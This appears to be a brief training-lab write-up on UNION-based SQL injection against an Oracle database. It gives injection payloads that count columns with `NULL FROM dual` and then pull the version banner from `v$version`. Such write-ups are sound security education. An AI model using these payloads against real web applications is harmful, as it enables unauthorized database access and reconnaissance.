We know the server is Oracle. Every `SELECT` statement must use `FROM`. For this purpose Oracle has a table called `dual`. Our payload will use that.

Starting by finding the number of columns.
```
' UNION SELECT NULL FROM dual --
' UNION SELECT NULL,NULL FROM dual --
```

And by searching version query for Oracle 

```
' UNION SELECT NULL,banner FROM v$version --
```

we can complete the lab.
